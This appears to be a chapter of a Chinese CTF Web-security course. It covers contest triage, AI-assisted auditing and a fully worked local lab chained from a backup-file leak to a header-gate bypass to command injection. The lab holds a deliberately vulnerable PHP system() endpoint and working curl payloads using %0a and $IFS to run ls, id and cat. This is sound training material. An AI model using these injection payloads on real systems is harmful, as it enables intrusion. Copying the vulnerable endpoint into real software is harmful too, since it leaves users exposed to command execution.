> 本章的表回答"现象属于哪一章"；[[R16-综合实战案例复盘|R16]] 的模式库条目回答"确认模式之后怎么解"。两者字段一致（特征/原理/解法/出处/例题），Web 侧条目的"特征"栏填页面功能与响应现象，不填反汇编形状。刷题量上来之后，把本章这张表当成模式库的**目录层**，每道新题按第 5 节的方法沉淀成条目。

## 2. 赛事工作流：Web 方向

报名、组队、状态板、止损规则、WriteUp 模板、行为红线，[[R17-赛事策略与团队协作|R17]] 已按"赛前—赛中—赛后"成体系讲过；PWN 手的节奏在 [[P22-综合实战赛事策略与AI辅助|P22]] 第 5 节。本节只补 Web 方向的差异，通用规则一句带过加双链，不重讲。

### 2.1 开赛准备：Web 侧的加购清单

[[R17-赛事策略与团队协作#4. 赛前：开赛清单|R17 第 4 节]]的通用清单之上，Web 手赛前一天加过这几项：

- [ ] 浏览器就位：DevTools 的 Network 面板与 Copy as cURL 用熟（[[W01-Web安全导论与HTTP深化#7. DevTools Network 面板系统用法|W01 第 7 节]]），代理插件指向 Burp；
- [ ] Burp 能启动、能抓 HTTPS：Proxy 拦截规则、Repeater、Intruder 各过一遍（[[W02-工具链实战与靶场搭建#3. Burp 深入：Proxy 与 Repeater|W02 第 3、4 节]]），Community 版的限速心里有数（[[W02-工具链实战与靶场搭建#4.4 Community 限速与命令行等价做法|W02 4.4]]）；
- [ ] 本地起靶能力可用：`php -S` 与 Python 标准库各起一个服务（[[W02-工具链实战与靶场搭建#2. 自建靶场：php -S 与 Python 标准库|W02 第 2 节]]）——赛时验证 payload、复现队友题目都靠它；
- [ ] 命令行工具在 PATH：sqlmap（[[W04-SQL注入|W04]]）、目录扫描（gobuster 或 [[W03-信息泄露与前端安全#7.3 python 版：状态码与长度过滤|W03 7.3]] 的手写脚本）、nc/socat（无回显外带的接收端，[[W05-命令注入与代码执行#6. 无回显 RCE|W05 第 6 节]]）；
- [ ] payload 模板目录备好：第 1 节地图里注入类、渲染类、反序列化各章的代表性 payload 各存一条，格式见第 5.4 节；
- [ ] 约定确认：靶场端口段（平时按 [[W02-工具链实战与靶场搭建#2.5 目录组织与端口约定|W02 2.5]] 分章占用，本章占 9950 段）、flag 提交格式、共享笔记的位置。

> [!warning] curl 记得带 --noproxy
> 本库各章的 curl 命令一律带 `--noproxy '*'`：它的作用是让 curl 对所有主机都不走代理，直连目标。如果 shell 里设过 `http_proxy` 一类环境变量，不带这个参数的请求会被送进代理，打靶时表现为超时或连接被拒——赛时排这个问题的第一反应就是检查代理。

### 2.2 题目分诊：开赛前 15 分钟

[[R17-赛事策略与团队协作#5.1 开赛第一个小时|R17 5.1]] 的开局一小时里，Web 手的第一件事是把全部 Web 题在浏览器里打开一遍，单题上限 3 分钟——分诊不是解题，是给每道题采集分级信号，写进状态板。每道题记三样：入口地址与端口、可见功能点、有无附件或源码。

分诊的三问，问完就能给题定级：

1. **输入面在哪**：URL 参数、请求头、请求体、上传文件、XML/JSON，还是纯业务流程？
2. **有没有源码或泄露**：附件给了源码、报错页带栈回显、页面上有注释与备份残留——有源码的题审计优先，因为第一环已经替你完成了一半；
3. **功能点对应第 1 节的哪一类**：按特征表归类，同类特征出现几处，考点就可能串成链。

Web 特有的快扫信号与判断：

| 快扫信号 | 判断 | 工时预期 | 先翻哪章 |
| ---- | ---- | ---- | ---- |
| 附件带源码或仓库链接 | 审计优先，输入点直接读代码 | 低——省掉黑盒探测 | 对应漏洞章 + [[W03-信息泄露与前端安全#5. JS 信息收集\|W03 第 5 节]] |
| 登录框、列表页、搜索框 | 注入类与逻辑类并行测 | 中 | [[W04-SQL注入\|W04]] · [[W13-逻辑与认证漏洞\|W13]] |
| 上传、头像、导入入口 | 三要素逐环试（能传/知道路径/能解析） | 中 | [[W07-文件上传\|W07]]；XML 类附件兼看 [[W11-XXE\|W11]] |
| URL 预览、截图、转 PDF | SSRF 预期，内网字样加工时 | 中到高 | [[W10-SSRF\|W10]] |
| 留言板 + bot/robot 字样 | XSS 预期，盲打链路 | 中 | [[W08-XSS\|W08]] |
| Node.js/package.json | 语言特性类 | 中 | [[W14-原型污染与Node.js\|W14]] |
| Flask session 形状、YAML 入口 | Python 数据变代码类 | 中 | [[W15-Python反序列化与沙箱逃逸\|W15]] |
| 前后端代理、CDN/缓存字样 | 协议层类，工时按高档预估 | 高 | [[W16-HTTP请求走私与缓存投毒\|W16]] |
| 多主机拓扑或"内网还有一台" | 链式综合题，单点漏洞只是起点 | 高 | [[W19-综合渗透与内网初步\|W19]] |

分级排序仍按 [[R17-赛事策略与团队协作#5.2 题目分级：三个信号|R17 5.2]] 的三个信号走：已解出队数、分值走向、题面用词。==保护面信息只回答"这题要多少工序"，先做哪道由已解出队数说了算==。

### 2.3 时间盒与多题并行：上下文切换卡片

止损规则沿用 [[R17-赛事策略与团队协作#5.3 卡题止损与 hint 决策|R17 5.3]] 的 30 分钟止损。Web 方向多两件特有的事：

**第一件：让机器替你花时间。** 目录扫描、sqlmap 拖库、时间盲注脚本，都是"启动之后等结果"的活——启动它们，然后切去下一题，回来看输出。等待不是止损的借口，==扫描在后台跑的时候，你不是在卡题==。

**第二件：换题前写上下文卡片。** Web 题的状态散在浏览器标签、Burp history 和你脑子里，隔两小时回来等于重做。每道动过的题留一张五行卡片，换题前 30 秒填完：

| 栏 | 填什么 |
| ---- | ---- |
| 入口 | URL、端口、已知参数与接口 |
| 已确认 | 成立的判断，每条带证据（一次响应、一行源码） |
| 已排除 | 试过且否定的路线，每条带失败现象 |
| 下一步第一动作 | 回来时不经思考就能执行的那一步 |
| 挂起原因 | 在等什么（扫描结果、hint、队友的另一个漏洞） |

"下一步第一动作"是卡片的灵魂：写"再看看注入"没用，写"对 sort 参数发 `%27` 看报错"才有用。止损记录、WriteUp 草稿、赛后复盘，都从这五栏取材。

### 2.4 队友同步：一句一个攻击面

[[R17-赛事策略与团队协作#3.2 队内协作惯例|R17 3.2]] 的状态板回答"这题谁在做、到哪了"；Web 手在频道里的同步要回答"这题有哪些面、各是什么状态"。格式约定：==每句话只说一个攻击面，面 + 状态，不带整体评价==：

```text
[backup_box] 上传点：黑名单后缀，.php3 未拦，已传马，路径未知
[backup_box] 登录框：单引号报错，布尔盲注成立，正在拖表
[backup_box] 首页：注释里有备份目录线索，/backup/ 404，待扫文件名
```

三句话拆开了三个面，队友扫一眼就知道哪块能接手、哪块在等什么。反面写法是"这题有点难，感觉是个组合题"——它不包含任何可执行的信息。需要跨方向交接时，按 [[R17-赛事策略与团队协作#9. RE 与 PWN 的协同|R17 第 9 节]]的三行格式给二进制类请求，按 [[P22-综合实战赛事策略与AI辅助#5.3 卡题换手的交接格式|P21 5.3]] 的四行格式交接堆题；Web 这边交出去的一般是"拿到 shell 之后的主机"，接进来的一般是"二进制附件里藏的地址与逻辑"。

## 3. AI 辅助：Web 方向的用法与边界

[[R16-综合实战案例复盘#8. AI 辅助分析：假设与验证的分工|R16 第 8 节]]给 RE 侧立了"AI 给假设、人工验证、修正"的闭环，[[P22-综合实战赛事策略与AI辅助#3. AI 辅助利用：能做什么，必须自己做什么|P22 第 3 节]]把 PWN 侧的边界落到了数值查证上。Web 侧的分工表不同、红线相同：

| 位置 | 你给它什么 | 它产出什么 | 你的动作 |
| ---- | ---- | ---- | ---- |
| payload 变体生成 | 当前 payload、过滤规则（黑了哪些字符、长度上限） | 绕过变体清单 | 逐个打靶；变体是否成立以 [[W04-SQL注入\|W04]]–[[W09-SSTI\|W09]] 各章的绕过写法为基准 |
| 源码审计的第二双眼睛 | 接口或函数源码 | 输入点清单与漏洞假设，按可能性排序 | 与自己的审计结论对照，每条标一条验证命令（3.2 完整示范） |
| 日志与报错解读 | 报错原文、触发请求、观察到的响应差异 | 机制解释与排查方向 | 回靶机确认它说的检查真的存在 |
| 脚本初稿 | 交互格式（方法、参数、编码）、题目类型 | 扫描或利用脚本骨架 | URL、路径、flag 位置等具体值自己填——[[P22-综合实战赛事策略与AI辅助#3.3 工作流实证：骨架、三个空、一次跑通\|P21 3.3]] 的占位纪律 |

共同点与 [[P22-综合实战赛事策略与AI辅助#3.1 AI 在工作流里的四个位置|P21 3.1]] 说的一致：AI 处理的是文本，产出的是文本。Web 题里有三类东西不是文本任务：

1. **对具体靶的攻击面判断。** 它没见过你的靶机。"这种站一般还有 /admin"是概率猜测，不是观察结论；页面下有没有那个接口，一次目录扫描的事。
2. **链路的临场决策。** 先读源码还是先扫目录、发现两个漏洞先打哪个，取决于现场输出。它可以列出决策因素，决定要你自己下。
3. **环境事实。** flag 路径、命令执行函数是否被禁、目标服务版本，一条命令就能落实的事，不问它。

==红线与 R16、P21 相同：AI 的每一条产出，都要落成一条可以执行的检验命令==。证实了进模式库的例题注脚，证伪了进错题本——两种结果都比照单全收值钱。

### 3.2 示范：把战例的源码交给 AI

用第 4 节战例的中间产物做一次完整示范。设定：你刚通过备份文件拿到一份接口源码（4.2 节的 `app.php.bak`），自己还没细读。prompt 按这个骨架写：

```text
我在打一道 CTF Web 题。下面是通过备份文件拿到的接口源码（PHP）：

<贴 4.2 节拿到的源码全文>

环境事实：PHP 8，php -S 内置服务器，Linux 靶机，该接口可直接访问。

请只输出假设清单，按可能性从高到低列出这个接口的漏洞点与利用顺序。
每条假设给出：漏洞位置、触发条件、一条能在靶机上执行的验证命令。
凡依赖靶机环境事实的值（flag 路径、目录内容、函数是否可用）一律标注
"待验证"。不要替我假设环境，不要输出完整 exploit。
```

按这份 prompt，合理的回答长这样（要点摘录）：

> 1. `X-Forwarded-For` 校验可绕过：该头由客户端提供，直接伪造即可（验证：带该头请求，观察 403 是否消失）。
> 2. `$host` 未做白名单，拼接进 `system()`，是命令注入。黑名单只滤 `; & |` 反引号和空格，换行符、重定向、`$IFS` 均未覆盖（验证：host 填 `127.0.0.1%0a id`，看是否执行第二条命令）。
> 3. `strlen($host) > 64` 限制 payload 长度，长命令需拆步（待验证：具体预算以内能容下哪些命令）。
> 4. flag 路径、`ping` 是否存在、`system` 是否被禁用：待验证，需在靶机上确认。

对照 3.1 的分工逐条看：第 1、2 条是"读文本"能得出的，成立与否各有一条验证命令；第 3 条是边界提示；第 4 条它自己标了待验证——==flag 在哪、命令能不能执行，是靶机上的事实，prompt 里要求它标注而不是猜测，交互边界就守住了==。接下来你按清单逐条上靶：伪造请求头（[[W01-Web安全导论与HTTP深化#2.3 题型：校验请求头才给 flag|W01 2.3]]）、换行绕过（[[W05-命令注入与代码执行#4.3 换行与注释：换行符与井号|W05 4.3]]）、`$IFS` 顶空格（[[W05-命令注入与代码执行#5.1 空格被滤|W05 5.1]]），每条命令的输出决定假设的去留。这条流程与第 4 节的实战步骤一一对应，可以对照着走。

> [!warning] 赛内先读规则，再决定发不发题
> 把未结束赛事的附件、源码发给在线服务，可能触碰比赛的保密与公平条款，[[P22-综合实战赛事策略与AI辅助#3.4 纪律清单|P21 3.4]] 的纪律四与 [[R17-赛事策略与团队协作#10. 心态与行为红线|R17 第 10 节]]的红线同源。拿不准就不发，或只把源码投给本地部署的模型；本节示范的 prompt 骨架不依赖任何在线服务，离线照样成立。

## 4. 示范战例：从信息泄露到 RCE 的完整链

本节按比赛节奏完整打一道自建组合靶。题目只有一句话：**靶机 127.0.0.1:9950，找到 flag。**靶场用 [[W02-工具链实战与靶场搭建#2. 自建靶场：php -S 与 Python 标准库|W02 第 2 节]]的做法搭建，全程命令配输出，每一步的手法都来自前面的章节。

### 4.1 靶场设计与准备

三环结构，每环单独对应一章，环环之间靠"上一环的产出"衔接：

| 环 | 漏洞 | 章节出处 | 产出 |
| ---- | ---- | ---- | ---- |
| 一 | 备份文件泄露（robots 线索 + 文件名扫描） | [[W03-信息泄露与前端安全\|W03]] | 隐藏接口的源码 |
| 二 | 无链接接口 + 请求头闸门 | [[W01-Web安全导论与HTTP深化\|W01]] · [[W13-逻辑与认证漏洞\|W13]] | 一个可交互的内部接口 |
| 三 | 命令拼接 + 黑名单过滤 | [[W05-命令注入与代码执行\|W05]] | 命令执行 |

靶场文件结构：

```text
labs/w20/www/
├── index.html
├── robots.txt
├── app.php
└── backup/
    └── app.php.bak
```

`index.html` 与 `robots.txt` 是两个静态文件，内容如下：

```html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>CTFBox</title></head>
<body>
<h1>It works!</h1>
<p>powered by php</p>
<!-- TODO(release): 上线前移除 /backup/ 目录，并删掉 robots.txt 里的 Disallow -->
</body>
</html>
```

```text
User-agent: *
Disallow: /backup/
```

`app.php` 的源码就是 4.2 节拿到的 `app.php.bak` 的内容——自建时把那份源码存两份：`www/app.php` 与 `www/backup/app.php.bak`。flag 放在用户家目录下，文件名带一段随机后缀，模拟"路径未知"：

```bash
mkdir -p ~/labs/w20/www/backup
echo 'flag{w20_1nf0_t0_rce_cha1n}' > /home/hua/flag_7c9eb5.txt
php -S 127.0.0.1:9950 -t ~/labs/w20/www
```

输出：

```
[Sat Oct 24 00:32:50 2026] PHP 8.5.4 Development Server (http://127.0.0.1:9950) started
```

> [!note] 本章的实验约定
> 靶机地址 127.0.0.1:9950，攻击命令全部用 curl 发出，带 `--noproxy '*'` 直连（见 2.1 的说明）。后面每步的响应里都先回显一段 ping 的统计信息，那是接口正常功能的输出；4.4 节起只贴注入命令自己的输出。

### 4.2 第一环：信息泄露拿源码

按 [[W03-信息泄露与前端安全|W03]] 的顺序起步：先看页面本身。主页只有一行"It works!"，但源码里有一条注释：

```bash
curl -s --noproxy '*' http://127.0.0.1:9950/
```

输出：

```html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>CTFBox</title></head>
<body>
<h1>It works!</h1>
<p>powered by php</p>
<!-- TODO(release): 上线前移除 /backup/ 目录，并删掉 robots.txt 里的 Disallow -->
</body>
</html>
```

前端源码是可信的信息来源（[[W03-信息泄露与前端安全#5.1 前端 JS 为什么可信|W03 5.1]]）：注释提到了两样没删干净的东西——`/backup/` 目录和 robots 里的 Disallow。顺着看 robots.txt：

```bash
curl -s --noproxy '*' http://127.0.0.1:9950/robots.txt
```

输出：

```
User-agent: *
Disallow: /backup/
```

robots.txt 是写给搜索引擎的，也是写给攻击者的目录地图。请求 `/backup/` 本身：

```bash
curl -s --noproxy '*' -o /dev/null -w '%{http_code}\n' http://127.0.0.1:9950/backup/
```

输出：

```
404
```

目录存在线索但列不出内容——不是每台服务器都开目录列表。下一步按 [[W03-信息泄露与前端安全#2. 备份文件与编辑器残留|W03 第 2 节]]的备份后缀全集，对 `/backup/` 做"文件名 × 备份后缀"的扫描。扫描脚本沿用 [[W03-信息泄露与前端安全#7.3 python 版：状态码与长度过滤|W03 7.3]] 的思路，状态码与响应长度一起看：

```python
#!/usr/bin/env python3
# scan_backup.py —— 对 /backup/ 做文件名×备份后缀扫描：状态码与长度一起看（W03 7.3 思路）
import urllib.error
import urllib.request

BASE = 'http://127.0.0.1:9950/backup/'
NAMES = ['app', 'api', 'index', 'www', 'site', 'func']
SUFS = ['.php.bak', '.bak', '.php~', '.old', '.txt', '.zip']

# 不走代理（等价于 curl 的 --noproxy）
opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

for n in NAMES:
    for s in SUFS:
        path = n + s
        try:
            r = opener.open(BASE + path, timeout=3)
            body = r.read()
            print('%-22s %d  %d' % (path, r.status, len(body)))
        except urllib.error.HTTPError as e:
            print('%-22s %d  %d' % (path, e.code, len(e.read())))
```

```bash
python3 scan_backup.py
```

输出（36 个组合，前 6 行如下，其余 30 个组合同样全是 404）：

```
app.php.bak            200  520
app.bak                404  615
app.php~               404  616
app.old                404  615
app.txt                404  615
app.zip                404  615
……
```

唯一的 200 是 `app.php.bak`，520 字节。404 的响应体长度在 615 到 621 之间小幅变动，那是错误页把请求路径回显了进去——==判别命中看状态码，怀疑软 404 时才把长度拉进来一起看==（[[W03-信息泄露与前端安全#7.3 python 版：状态码与长度过滤|W03 7.3]]）。把备份文件取下来：

```bash
curl -s --noproxy '*' http://127.0.0.1:9950/backup/app.php.bak
```

输出：

```php
<?php
// app.php —— 内部接口：不在任何页面上链接，仅供运维排查使用
$xff = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
if ($xff !== '127.0.0.1') {
    http_response_code(403);
    exit("forbidden");
}

$action = $_GET['action'] ?? '';
if ($action !== 'ping') {
    exit("unknown action");
}

$host = $_GET['host'] ?? '';
if ($host === '' || strlen($host) > 64) {
    exit("bad host");
}
if (preg_match('/[;&|` ]/', $host)) {
    exit("bad host");
}

$cmd = "ping -c 1 -W 1 " . $host;
system($cmd);
```

第一环完成：源码到手，而页面上从来没有链接过这个接口。

### 4.3 第二环：源码审计——隐藏接口与请求头闸门

源码一共五段逻辑，逐段读出审计结论：

| 源码 | 读出什么 | 下一步动作 |
| ---- | ---- | ---- |
| `$_SERVER['HTTP_X_FORWARDED_FOR'] !== '127.0.0.1'` | 闸门只认 X-Forwarded-For 头，而==这个头由客户端提供== | 伪造请求头（[[W01-Web安全导论与HTTP深化#2.3 题型：校验请求头才给 flag\|W01 2.3]]） |
| `$action !== 'ping'` | 接口只有一个功能：ping | 带 `action=ping` 探测 |
| `strlen($host) > 64` | host 有 64 字节预算 | 长 payload 拆步（[[W05-命令注入与代码执行#5.4 长度受限\|W05 5.4]]） |
| `preg_match` 一行 | 黑名单只有五个字符：分号、&、管道、反引号、空格 | 探测确认后从黑名单外找替身（[[W05-命令注入与代码执行#5. 过滤与绕过全集\|W05 第 5 节]]） |
| `system("ping -c 1 -W 1 " . $host)` | host 原样拼进 shell 命令 | 命令注入（[[W05-命令注入与代码执行#2.1 命令执行：system 一族与反引号\|W05 2.1]]） |

"不在页面上链接的接口"是未授权访问与隐藏入口的常见形态（[[W13-逻辑与认证漏洞#6. 未授权访问与隐藏入口|W13 第 6 节]]）；它的位置信息只能从源码、JS 或报错里来，这正是第一环的价值：==信息泄露不是漏洞清单里的一个条目，而是链条的第一环==。

先按源码试探接口。不带头，闸门生效：

```bash
curl -s --noproxy '*' -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:9950/app.php?action=ping&host=127.0.0.1'
curl -s --noproxy '*' 'http://127.0.0.1:9950/app.php?action=ping&host=127.0.0.1'
```

输出：

```
403
```

```
forbidden
```

带上伪造的头：

```bash
curl -s --noproxy '*' -H 'X-Forwarded-For: 127.0.0.1' 'http://127.0.0.1:9950/app.php?action=ping&host=127.0.0.1'
```

输出：

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.049 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.049/0.049/0.049/0.000 ms
```

闸门过了，接口的完整功能回显在眼前。第二环完成：手上多了一个能到达 `$host` 参数的入口。

### 4.4 第三环：黑名单外的命令注入

先确认墙在哪。按源码的黑名单注入一个分号：

```bash
curl -s --noproxy '*' -H 'X-Forwarded-For: 127.0.0.1' 'http://127.0.0.1:9950/app.php?action=ping&host=127.0.0.1%3Bls'
```

输出：

```
bad host
```

`%3B` 是分号的 URL 编码，返回 `bad host`——黑名单在工作。==先探明过滤再谈绕过==：黑名单只列了五个字符，那么没列的都可用。分隔符要新的：换行符不在黑名单里，URL 编码 `%0a` 就是它（[[W05-命令注入与代码执行#4.3 换行与注释：换行符与井号|W05 4.3]]）；空格用 `$IFS` 顶替（[[W05-命令注入与代码执行#5.1 空格被滤|W05 5.1]]）。组合起来，先确认能执行任意命令：

```bash
curl -s --noproxy '*' -H 'X-Forwarded-For: 127.0.0.1' 'http://127.0.0.1:9950/app.php?action=ping&host=127.0.0.1%0als$IFS/home/hua'
```

输出（ping 统计之后接 ls 的结果）：

```
ctf-tools
flag_7c9eb5.txt
labs
p1
……
```

命令执行到手：响应里出现了 `/home/hua` 的目录列表。64 字节的预算对这条命令绰绰有余（`127.0.0.1` 加换行加 `ls$IFS/home/hua` 共 25 字节）；要发更长的命令时按 [[W05-命令注入与代码执行#5.4 长度受限|W05 5.4]] 的思路拆步。黑名单外的替身不止一条：`$()` 命令替换用的圆括号不在黑名单里，输入重定向 `<` 也能顶替 `cat` 后面的空格——多个替身都能到达同一个执行点（[[W05-命令注入与代码执行#5. 过滤与绕过全集|W05 第 5 节]]）。

### 4.5 收尾：定位并读取 flag

RCE 之后是主机侧的信息收集。先确认执行身份：

```bash
curl -s --noproxy '*' -H 'X-Forwarded-For: 127.0.0.1' 'http://127.0.0.1:9950/app.php?action=ping&host=127.0.0.1%0aid'
```

输出（ping 统计之后接 id 的结果）：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

uid 1000 的 hua——4.1 节的靶场准备把 flag 放在了 `/home/hua/` 下，上一条 `ls` 已经看到了 `flag_7c9eb5.txt`。读它：

```bash
curl -s --noproxy '*' -H 'X-Forwarded-For: 127.0.0.1' 'http://127.0.0.1:9950/app.php?action=ping&host=127.0.0.1%0acat$IFS/home/hua/flag_7c9eb5.txt'
```

输出（ping 统计之后接 cat 的结果）：

```
flag{w20_1nf0_t0_rce_cha1n}
```

flag 到手，链路闭环。id 的输出顺带给了一条方向性线索：groups 里有 `sudo` 和 `docker`——如果这题还有下一层（另一个用户、另一台主机），提权与横向的入口就在这两个组里，那是综合渗透章节的领地。

> [!info]- flag 不在家目录里怎么办
> 上面拿到 flag 靠的是"ls 就看到"的顺路局。路径未知时按固定顺序搜：`ls$IFS/` 看根目录有没有 `/flag` 一类的显眼文件；没有就用 find 按名字搜：`find$IFS/$IFS-maxdepth$IFS3$IFS-name$IFS"flag*"$IFS2>/dev/null`（`2>/dev/null` 把无权限目录的报错丢掉，重定向符不在黑名单里）。注意最后这条按原文写是 68 字节，超出了 64 字节预算——正是 4.4 说的拆步场景：先 `ls$IFS/` 看根目录，多数题到这一步已经看到；实在要用 find，就先 `ls$IFS/home` 缩小目录再搜。再不行翻 Web 根目录与环境变量（`env`）。这套顺序在文件名带随机后缀的题里几乎必中其一。

### 4.6 出题视角：这题考了什么

跳出来当一次出题人，链路上每个环节都是刻意的：

| 环节 | 出题人给的 | 考什么 | 章节 |
| ---- | ---- | ---- | ---- |
| 注释 + robots | 第一条线索明摆在页面上 | 会不会看源码与公开文件 | [[W03-信息泄露与前端安全\|W03]] |

| 无链接的接口 | 源码里才有接口名 | 审计意识：源码改变攻击面 | [[W13-逻辑与认证漏洞#6. 未授权访问与隐藏入口\|W13 第 6 节]] |
| X-Forwarded-For 闸门 | 认的头由客户端控制 | 请求头的可信边界 | [[W01-Web安全导论与HTTP深化#2.3 题型：校验请求头才给 flag\|W01 2.3]] |
| 黑名单五字符 | 换行与 IFS 留在墙外 | 过滤探测先于绕过 | [[W05-命令注入与代码执行\|W05]] |

## 5. 复盘方法与赛后资产沉淀

复盘会的开法与通用产出物在 [[R17-赛事策略与团队协作#8. 赛后：复盘|R17 第 8 节]]；模式库思想在 [[R16-综合实战案例复盘|R16]]。本节把两者落到 Web 侧的三件专属产出上。

### 5.1 Web 侧的模式库条目

条目五字段沿用 [[R16-综合实战案例复盘|R16]] 的模板，Web 条目的"特征"栏填页面功能与响应现象。用第 4 节的战例生产一条样例：

> [!info]- 模式库条目：备份泄露到隐藏接口的链
>
> | 字段 | 内容 |
> | ---- | ---- |
> | 特征 | 页面注释/robots 提到目录；目录不列表；页面上没有链接的接口名在源码或 JS 里出现；源码里有"参数拼进执行函数"的功能点 |
> | 原理 | 发布残留把内部实现暴露给攻击者；内部接口的闸门常建立在客户端可控的输入上；拼进 shell 的参数只要有一个黑名单外字符就能执行第二条命令 |
> | 解法 | robots 与注释定目录 → 文件名×备份后缀扫描拿源码 → 审计列输入点与过滤 → 从黑名单外选替身逐个上靶 |
> | 出处 | [[W03-信息泄露与前端安全\|W03]] 第 2、7 节 · [[W01-Web安全导论与HTTP深化#2.3 题型：校验请求头才给 flag\|W01 2.3]] · [[W05-命令注入与代码执行#5. 过滤与绕过全集\|W05 第 5 节]] · 本章第 4 节 |
> | 例题 | 本章组合靶；同类变体：.git 泄露换掉备份文件、JWT 换掉请求头闸门、SSTI 换掉命令注入 |

每道做过的题都按这个格式问一遍能不能提条目；提不出来，说明这道题还停在"做完了"，没到"做透了"（[[R16-综合实战案例复盘#1. 为什么要建模式库|R16 第 1 节]]的三问）。

### 5.2 攻击链路图

链式题的复盘先画链路：一行一个节点，每个节点标输入面、动作、章节。第 4 节的战例画出来是：

```text
主页注释 + robots.txt ──→ /backup/ 扫描 ──→ app.php.bak ──→ 源码审计
   [W03]                      [W03 7.3]         [W03 2.1]        │
                                                                 ▼
flag{...} ←── cat ←── ls 定位 ←── id 确认身份 ←── %0a + $IFS ←── XFF 闸门
  [flag]     [W05]       [信息收集]      [id]        [W05 4.3/5.1]  [W01 2.3]
```

画图的价值在卡点会自己显形：哪一段你走了回头路、哪一段靠运气连上，线上看得一清二楚。卡点按 [[R08-CrackMe经典题型#9. 三遍学习法与错题本|R8 第 9 节]]的四列模板进错题本，Web 常见的卡点类型三种：**过滤想不全**（黑名单探测不系统，替身清单背得不熟，回 [[W05-命令注入与代码执行#5. 过滤与绕过全集|W05 第 5 节]]重过）、**回显与无回显判断错**（把"没回显"当成"没执行"，回 [[W05-命令注入与代码执行#6. 无回显 RCE|W05 第 6 节]]）、**方向选错**（有源码不读去黑盒猜，回第 2.2 节分诊三问）。

### 5.3 payload 库

[[P22-综合实战赛事策略与AI辅助#6. 赛后复盘：PWN 题的产出物|P22 第 6 节]]给 PWN 建了 exp 库；Web 手对应的资产是 payload 库——按漏洞类分目录，每条 payload 一个纯文本文件，头部三行注释：

```text
payload-lib/
├── sqli/
│   ├── union_column_probe.txt      # UNION 列数探测序列
│   └── time_blind_mysql.txt        # sleep 时间盲注模板
├── cmdexec/
│   ├── space_replacements.txt      # 空格替身全集：$IFS / ${IFS} / %09 / <
│   └── separator_replacements.txt  # 分隔符替身：换行、$() 与黑名单的对照
├── xss/
│   └── event_handler_set.txt       # 事件处理器 payload 组
├── ssti/
│   └── engine_probe.txt            # {{7*7}} 一族探测与引擎判别
└── deser/
    └── phar_trigger_funcs.txt      # phar 触发函数面清单
```

```text
# 来源：W05 第 5.1 节 / XXCTF backup_box
# 适用：空格被滤，$ 与花括号未被滤
# 上次命中：2026-10 w20 组合靶
```

两条归档原则与 exp 库一致：==payload 库的价值在检索，不在收集==——头部注释的"适用"一行就是检索键，赛时按黑名单特征查文件；同一用途只留最优的一份，旧的移进归档目录。回连地址、目标 URL 一律写占位符（`{{LHOST}}`、`{{TARGET}}`），用时替换——第 6 节常见问题里有一条事故就源于抄来的 payload 忘了改地址。

## 6. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| 靶机端口和题面写的对不上 | 赛题实例常映射到随机端口；以平台连接信息页给出的地址为准，题面端口只当参考 |
| curl 打靶超时或连不上 | shell 里设了 `http_proxy` 一类变量，请求被送进代理；加 `--noproxy '*'` 直连（2.1） |
| 目录扫描跑了半天没结果 | 单线程开发服务器被高频请求排队，降线程数慢扫；对不存在路径回退 200 的服务器（软 404）要按响应长度与内容判别，不能只看状态码（[[W03-信息泄露与前端安全#7.3 python 版：状态码与长度过滤\|W03 7.3]]） |
| payload 打完没反应，回连一直收不到 | 抄来的 payload 里回连地址还是别人的；入库时地址一律写成 `{{LHOST}}` 占位符，用时替换，提交前检查一遍（5.3） |
| 一道题磕了三小时，其他 Web 题没人动 | 机会成本失控：30 分钟止损（[[R17-赛事策略与团队协作#5.3 卡题止损与 hint 决策\|R17 5.3]]），卡点写进上下文卡片后换题；让扫描器在后台替你花时间（2.3） |
| 命令注入的 payload 拼进去没有任何输出 | 先判"有没有执行"再谈绕过：延时、外带、写文件三条路确认执行面（[[W05-命令注入与代码执行#6. 无回显 RCE\|W05 第 6 节]]），无回显不是无漏洞 |
| 黑名单绕过想不全，试两个就放弃 | 替身清单不熟：空格、分隔符、命令名、长度四类各有固定替身集（[[W05-命令注入与代码执行#5. 过滤与绕过全集\|W05 第 5 节]]）；把 5.3 的 payload 库建起来，赛时按特征检索 |
| 拿到 shell 后读 flag 失败 | 先 `id` 看身份：flag 可能属主是别的用户或要求 root；`find` 按名字搜、看 Web 根与环境变量，都不行说明 flag 在权限墙后或需要先横向——那是综合渗透章节的领地 |
| 共享靶机被队友重启，链路全断 | 实例重置等于链路作废：约定一人一实例；重启后先确认上一环的落点还在（马还在、隧道还通），再继续（[[W19-综合渗透与内网初步\|W19]]） |
| 复盘时想不起当时卡在哪 | 赛中没留痕：换题前 30 秒填上下文卡片（2.3），卡片就是复盘的原始材料；空白卡片救不回两天前的思路 |
| AI 给的利用思路照做全部失败 | 它给的是"语言上自洽的假设"：逐条换成自己的命令输出再采信，环境事实（路径、函数、版本）一律自己查（第 3 节） |
| flag 提交显示错误 | 先查格式：前缀大小写、是否要包一层哈希、有无次数惩罚（[[R17-赛事策略与团队协作#2.3 CTFtime 报名流程\|R17 2.3]] 读规则时记下）；再核对是不是把别的题的 flag 提到了这题 |

## 7. 配套练习与延伸阅读

> [!note] 实战任务：按地图刷一轮，再完赛一次
> **第一轮（平台）**：在 [[01-练习平台索引|练习平台索引]] 选定的平台（BUUCTF、CTFshow 的 Web 区都按漏洞类分了标签）按第 1 节的地图刷 20 道：每个类别至少 2 道，做题时先自己归类（"这是哪一章的题"），再动手。归类错过的题价值最高——它暴露的是你特征表的盲区。**第二轮（赛事）**：按 [[R17-赛事策略与团队协作#2.2 第一场正式赛怎么选|R17 2.2]] 选一场新手友好的比赛，以 Web 主力完赛：分诊按 2.2 的三问与信号表，赛中执行 2.3 的卡片与止损，AI 参与守第 3 节的红线，赛后按第 5 节沉淀。完赛标准：解出至少 1 道 Web、错题本有新条目、payload 库有新增。

配套练习：

